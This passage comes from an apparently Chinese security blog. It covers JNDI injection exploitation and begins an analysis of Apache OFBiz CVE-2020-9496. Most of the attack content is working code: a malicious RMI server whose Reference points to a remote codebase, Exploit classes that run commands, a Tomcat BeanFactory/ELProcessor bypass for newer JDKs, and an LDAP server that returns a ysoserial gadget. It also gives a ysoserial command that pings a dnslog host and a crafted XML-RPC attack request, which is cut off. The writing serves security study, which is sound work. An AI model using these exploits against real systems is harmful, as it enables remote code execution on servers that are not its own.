<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">// 格式rmi://host:port/name。</span></span><br><span class="line"><span class="comment">// 其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字</span></span><br><span class="line"><span class="comment">// 如果RMI Registry在本地运行，那么host和port是可以省略的，</span></span><br><span class="line"><span class="comment">// 此时host默认是localhost，port默认是1099</span></span><br><span class="line">Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>





<p>攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP&#x2F;FTP&#x2F;SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载。</p>
<p>RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象。</p>
<p>这种方式将会受到 useCodebaseOnly 的限制。</p>
<p>利用条件如下：</p>
<ul>
<li>RMI客户端的上下文环境允许访问远程Codebase。</li>
<li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。</li>
</ul>
<h3 id="版本限制："><a href="#版本限制：" class="headerlink" title="版本限制："></a>版本限制：</h3><p>然而从JDK 6u45、7u21开始，**java.rmi.server.useCodebaseOnly **的默认值就是true。</p>
<p>当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。</p>
<p>使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
<h1 id="RMI-JNDI-Reference-Payload"><a href="#RMI-JNDI-Reference-Payload" class="headerlink" title="RMI + JNDI Reference Payload"></a>RMI + JNDI Reference Payload</h1><h3 id="RMI绑定JDNI-Reference对象"><a href="#RMI绑定JDNI-Reference对象" class="headerlink" title="RMI绑定JDNI Reference对象"></a>RMI绑定JDNI Reference对象</h3><p>注册表绑定的是Reference对象。</p>
<p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
<p>Server端</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(rmi_port);</span><br><span class="line"><span class="type">String</span> <span class="variable">remote_class_server</span> <span class="operator">=</span> <span class="string">&quot;http://192.168.1.200:8080/&quot;</span>;</span><br><span class="line"><span class="comment">//  Reference(String className, String factory, String factoryLocation)</span></span><br><span class="line"><span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;Exploit&quot;</span>, remote_class_server);</span><br><span class="line"><span class="comment">// Reference包装类</span></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>



<p>攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类。</p>
<p>但是原理上并非使用RMI Class Loading机制的，它最终是通过URLClassLoader加载的远程类。</p>
<p>因此不受 java.rmi.server.useCodebaseOnly 系统属性的限制（JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。），相对来说更加通用。</p>
<h3 id="恶意Exploit类写法"><a href="#恶意Exploit类写法" class="headerlink" title="恶意Exploit类写法"></a>恶意Exploit类写法</h3><p>Exploit.java</p>
<p>恶意类可以是任意普通类，只要它包含恶意的静态块或构造函数即可实现代码执行。</p>
<p>恶意代码可以写在静态代码块，构造方法中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">            String[] var2 = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>) ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, var1&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, var1&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">var3</span> <span class="operator">=</span> Runtime.getRuntime().exec(var2);</span><br><span class="line">            var3.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果Exploit实现了ObjectFactory接口，恶意代码还可以写在getObjectInstance方法中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> &#123;</span><br><span class="line">        exec(<span class="string">&quot;xterm&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">exec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">            String lineStr;</span><br><span class="line">            <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="literal">null</span>)</span><br><span class="line">                sb += lineStr + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">            <span class="keyword">return</span> sb;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><p>但是在**<font style="background-color:#FBDE28;">JDK 6u141, JDK 7u131, JDK 8u121 </font>**中Java提升了JNDI 限制了Naming&#x2F;Directory服务中JNDI Reference远程加载Object Factory类的特性。</p>
<p>系统属性<code> **com.sun.jndi.rmi.object.trustURLCodebase**、com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</p>
<p>如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。</p>
<h3 id="为什么远程利用会出现Timeout"><a href="#为什么远程利用会出现Timeout" class="headerlink" title="为什么远程利用会出现Timeout"></a>为什么远程利用会出现Timeout</h3><p>远程对象的通信Host不正确。</p>
<p>解决办法：</p>
<p>通过代码明确指定远程对象通信Host IP：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>,<span class="string">&quot;外网IP&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>或者在启动RMI服务时，通过启动参数指定 java.rmi.server.hostname 属性：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.hostname=服务器真实外网IP</span><br></pre></td></tr></table></figure>

<h1 id="RMI绕过高版本JDK限制"><a href="#RMI绕过高版本JDK限制" class="headerlink" title="RMI绕过高版本JDK限制"></a>RMI绕过高版本JDK限制</h1><h2 id="本地工厂类"><a href="#本地工厂类" class="headerlink" title="本地工厂类"></a>本地工厂类</h2><p>在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class，这个工厂类必须在受害目标本地的CLASSPATH中。</p>
<p>工厂类必须实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。</p>
<p>org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能。org.apache.naming.factory.BeanFactory 存在于Tomcat依赖包中，所以使用也是非常广泛。</p>
<p>org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</p>
<p>tips: 根据beanFactory的代码逻辑，要求传入的Reference为ResourceRef类。（ResourceRef 是Reference 的子类）</p>
<p>找到了javax.el.ELProcessor可以作为目标Class。</p>
<p>RMI Server的利用代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(rmi_port);</span><br><span class="line"><span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 强制将 &#x27;x&#x27; 属性的setter 从 &#x27;setX&#x27; 变为 &#x27;eval&#x27;, 详细逻辑见 BeanFactory.getObjectInstance 代码</span></span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;KINGX=eval&quot;</span>));</span><br><span class="line"><span class="comment">// 利用表达式执行命令</span></span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;KINGX&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<p>（1）“forceString”可以给属性强制指定一个setter方法，这里我们将属性”KINGX”的setter方法设置为 ELProcessor.eval() 方法。</p>
<p>（2）ResourceRef 中加上元素”KINGX”，赋值为需要执行的恶意代码</p>
<h2 id="限制："><a href="#限制：" class="headerlink" title="限制："></a>限制：</h2><p>这种绕过方式需要目标环境中存在Tomcat相关依赖，当然其他Java Server可能也存在可被利用的Factory类，可以进一步研究。</p>
<h1 id="LDAP-JNDI-Reference-Payload"><a href="#LDAP-JNDI-Reference-Payload" class="headerlink" title="LDAP + JNDI Reference Payload"></a>LDAP + JNDI Reference Payload</h1><h3 id="关于LDAP"><a href="#关于LDAP" class="headerlink" title="关于LDAP"></a>关于LDAP</h3><p>全称是轻量级目录访问协议</p>
<p>提供了一种查询、浏览、搜索和修改互联网目录数据的机制</p>
<p>简称目录服务</p>
<h3 id="LDAP返回JNDI-Reference对象"><a href="#LDAP返回JNDI-Reference对象" class="headerlink" title="LDAP返回JNDI Reference对象"></a>LDAP返回JNDI Reference对象</h3><p>除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p>
<p>并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。</p>
<h3 id="版本限制-1"><a href="#版本限制-1" class="headerlink" title="版本限制"></a>版本限制</h3><p>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在**<font style="background-color:#FBDE28;">Oracle JDK 11.0.1、8u191、7u201、6u211</font>**之后 <strong>com.sun.jndi.ldap.object.trustURLCodebase</strong> 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p>
<h1 id="LDAP绕过高版本JDK限制"><a href="#LDAP绕过高版本JDK限制" class="headerlink" title="LDAP绕过高版本JDK限制"></a>LDAP绕过高版本JDK限制</h1><h2 id="javaSerializedData"><a href="#javaSerializedData" class="headerlink" title="javaSerializedData"></a>javaSerializedData</h2><p>LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。</p>
<p>LDAP Server关键代码如下，我们在javaSerializedData字段内填入刚刚生成的反序列化payload数据：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">    e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">    <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/** Payload1: Return Evil Reference Factory **/</span></span><br><span class="line">    <span class="comment">// e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span></span><br><span class="line">    <span class="comment">// e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span></span><br><span class="line">    <span class="comment">// e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Payload2: Return Evil Serialized Gadget **/</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;|base64</span></span><br><span class="line">        e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,Base64.decode(<span class="string">&quot;rO0ABXNyABFqYXZhLn.....&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ParseException e1) &#123;</span><br><span class="line">        e1.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    result.sendSearchEntry(e);</span><br><span class="line">    result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<p>模拟受害者进行JNDI lookup操作，或者使用Fastjson等漏洞模拟触发，即可看到弹计算器的命令被执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"><span class="type">Object</span> <span class="variable">local_obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>这种绕过方式需要利用一个本地的反序列化利用链（如CommonsCollections）</p>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/07/JNDI%E6%B3%A8%E5%85%A5/" data-id="cm5l7vlhq0003fscxbgxk10b2" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\JNDI注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" rel="tag">注入漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Apache OFBiz XML-RPC漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/07/Apache%20OFBiz%20XML-RPC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/07/Apache%20OFBiz%20XML-RPC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Apache OFBiz XML-RPC漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Apache-OFBiz简介"><a href="#Apache-OFBiz简介" class="headerlink" title="Apache OFBiz简介"></a>Apache OFBiz简介</h1><p>Apache OFBiz (The Apache Open For Business Project) 是一个开源的企业自动化软件项目，它包含了ERP（企业资源计划）、CRM（客户关系管理）、电子商务等多个模块的框架系统。该项目提供了一个灵活的业务流程管理和自动化平台，被广泛应用于企业环境中。</p>
<h1 id="XML-RPC技术概述"><a href="#XML-RPC技术概述" class="headerlink" title="XML-RPC技术概述"></a>XML-RPC技术概述</h1><p>XML-RPC是一个规范和一组实现，允许软件在不同的操作系统上运行，在不同的环境中运行以通过网络进行过程调用。XML-RPC是使用 HTTP 作为传输和 XML 作为编码的远程过程调用。XML-RPC 被设计得尽可能简单，同时允许传输、处理和返回复杂的数据结构。</p>
<h2 id="XML-RPC请求结构"><a href="#XML-RPC请求结构" class="headerlink" title="XML-RPC请求结构"></a>XML-RPC请求结构</h2><p>XML-RPC请求响应相关内容具体参考：<a target="_blank" rel="noopener" href="http://xmlrpc.com/spec.md">http://xmlrpc.com/spec.md</a></p>
<p>XML-RPC数据类型具体参考：<a target="_blank" rel="noopener" href="https://ws.apache.org/xmlrpc/types.html">https://ws.apache.org/xmlrpc/types.html</a></p>
<h3 id="基本要求"><a href="#基本要求" class="headerlink" title="基本要求"></a>基本要求</h3><ul>
<li>请求必须使用 Content-Type: text&#x2F;xml</li>
<li>根标签为 methodCall，必须包含 methodName 子标签</li>
<li>参数通过 params 标签传递，每个参数都包含在 param 标签中</li>
<li>参数值默认为string类型，可以通过特定标签指定其他数据类型</li>
</ul>
<h2 id="请求示例"><a href="#请求示例" class="headerlink" title="请求示例"></a>请求示例</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /RPC2 HTTP/1.0</span><br><span class="line">User-Agent: Frontier/5.1.2 (WinNT)</span><br><span class="line">Host: betty.userland.com</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-length: 181</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>examples.getStateName<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">i4</span>&gt;</span>41<span class="tag">&lt;/<span class="name">i4</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="CVE-2020-9496漏洞分析"><a href="#CVE-2020-9496漏洞分析" class="headerlink" title="CVE-2020-9496漏洞分析"></a>CVE-2020-9496漏洞分析</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
<li>影响版本：Apache OFBiz &lt; 17.12.04</li>
<li>漏洞类型：远程代码执行</li>
<li>漏洞等级：严重</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考Vulhub：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/ofbiz/CVE-2020-9496/">https://vulhub.org/#/environments/ofbiz/CVE-2020-9496/</a></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当服务器启用了enabledForExtensions选项时，攻击者可以通过发送特制的XML-RPC请求，利用Apache Commons BeanUtils实现远程代码执行。这个漏洞主要涉及反序列化操作，攻击者可以通过构造恶意的序列化数据来实现代码执行。</p>
<p>注：</p>
<p>如果XML-RPC服务端设置了enabledForExtensions，那么就支持附加的数据类型，其中包括<serializable>标签，其中的内容为一个对象被转换为序列化的表示形式并作为Base64编码的字节数组。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="Payload生成"><a href="#Payload生成" class="headerlink" title="Payload生成"></a>Payload生成</h3><p>使用ysoserial生成payload：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">&quot;ping -nc 1 ofbiz.xudce2.dnslog.cn&quot;</span> | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&quot;\\n&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="攻击请求构造"><a href="#攻击请求构造" class="headerlink" title="攻击请求构造"></a>攻击请求构造</h3><p>向&#x2F;webtools&#x2F;control&#x2F;xmlrpc接口发送payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /webtools/control/xmlrpc HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 4093</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>ProjectDiscovery<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span 